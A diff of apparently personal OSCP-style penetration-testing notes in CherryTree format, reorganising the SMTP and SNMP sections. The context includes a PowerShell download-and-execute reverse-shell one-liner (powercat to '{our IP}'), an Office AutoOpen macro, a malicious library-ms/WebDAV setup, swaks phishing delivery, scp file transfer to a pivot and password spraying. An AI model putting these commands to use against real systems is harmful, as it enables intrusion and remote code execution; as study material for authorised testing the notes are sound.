@@ -228,11 +228,8 @@ More on that here: </rich_text>
             <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</rich_text>
           </node>
         </node>
-        <node name="SMTP" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688922291" ts_lastsave="1689882594">
-          <rich_text>Before searching, it might be useful to update our MIB:
-</rich_text>
-          <rich_text justification="left"></rich_text>
-          <rich_text>
+        <node name="SMTP" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688922291" ts_lastsave="1690710189">
+          <rich_text>We can use Evolution as a SMTP UI client.
 
 - Check the version, some exim versions might be VULNERABLE.
 - Check for </rich_text>
@@ -280,10 +277,10 @@ Example:
 </rich_text>
           <rich_text style="italic">-ap</rich_text>
           <rich_text> is for providing auth passwords
-</rich_text>
-          <codebox char_offset="56" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo download-mibs
-# This will use /etc/snmp-mibs-downloader to download files from those config files.</codebox>
-          <codebox char_offset="274" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+
+Check this methodology: </rich_text>
+          <rich_text link="webs https://fareedfauzi.gitbook.io/oscp-playbook/services-enumeration/smtp">https://fareedfauzi.gitbook.io/oscp-playbook/services-enumeration/smtp</rich_text>
+          <codebox char_offset="258" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
 &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
 &lt;version&gt;6&lt;/version&gt;
@@ -302,10 +299,10 @@ Example:
 &lt;/searchConnectorDescription&gt;
 &lt;/searchConnectorDescriptionList&gt;
 &lt;/libraryDescription&gt;</codebox>
-          <codebox char_offset="327" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/</codebox>
-          <codebox char_offset="494" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{our IP}:8000/powercat.ps1');
+          <codebox char_offset="311" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/</codebox>
+          <codebox char_offset="478" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{our IP}:8000/powercat.ps1');
 powercat -c {our IP} -p 4444 -e powershell"</codebox>
-          <codebox char_offset="534" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Sub AutoOpen()
+          <codebox char_offset="518" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Sub AutoOpen()
     MyMacro
 End Sub
 
@@ -326,7 +323,7 @@ Sub MyMacro()
 
     CreateObject("Wscript.Shell").Run Str
 End Sub</codebox>
-          <codebox char_offset="709" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">swaks -t {to email} --from {from email} --attach {local file to attach} --server {IP of SMTP server} --body {txt file with body contents}
+          <codebox char_offset="693" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">swaks -t {to email} --from {from email} --attach {local file to attach} --server {IP of SMTP server} --body {txt file with body contents}
 --header "Subject: Example" --suppress-data -ap</codebox>
         </node>
         <node name="MSSQL" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1689500078" ts_lastsave="1689507889">
@@ -368,8 +365,13 @@ More on it here: </rich_text>
       </node>
       <node name="UDP" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1569559301" ts_lastsave="1579569609">
         <rich_text>[ NMAP OVERVIEW ]</rich_text>
-        <node name="SNMP" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569560995" ts_lastsave="1688924091">
-          <rich_text>AutoRecon.py will enumerate the service.
+        <node name="SNMP" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569560995" ts_lastsave="1690710008">
+          <rich_text>Before searching, it might be useful to update our MIB:
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>s
+
+AutoRecon.py will enumerate the service.
 Check out:
 - onesixtyone
 - snmpwalk
@@ -383,7 +385,9 @@ Also check RCE with SNMP (requires community string with write permissions): </r
           <rich_text>
 Also check this out: </rich_text>
           <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</rich_text>
-          <codebox char_offset="115" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v 1 -c {community string} {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull</codebox>
+          <codebox char_offset="56" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo download-mibs
+# This will use /etc/snmp-mibs-downloader to download files from those config files.</codebox>
+          <codebox char_offset="175" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v 1 -c {community string} {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull</codebox>
         </node>
       </node>
       <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1689882744">
@@ -813,12 +817,13 @@ Then we can transfer the files from the attacked machine:
         <codebox char_offset="248" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">echo "y" | .\scp.exe -P 6000 file kali@{pivot IP}:file # this is to accespt the key
 echo "password" | .\scp.exe -P 6000 file kali@{pivot IP}:file # the actual transfer</codebox>
       </node>
-      <node name="STUCK?" unique_id="116" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1690137934" ts_lastsave="1690137992">
+      <node name="STUCK?" unique_id="116" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1690137934" ts_lastsave="1690705730">
         <rich_text>-  Try </rich_text>
         <rich_text weight="heavy">spraying the credentials</rich_text>
         <rich_text>, maybe a password is reused by another user (but </rich_text>
         <rich_text weight="heavy">watch out for account lockouts</rich_text>
-        <rich_text>)</rich_text>
+        <rich_text>)
+- Check for password reusal</rich_text>
       </node>
     </node>
   </node>
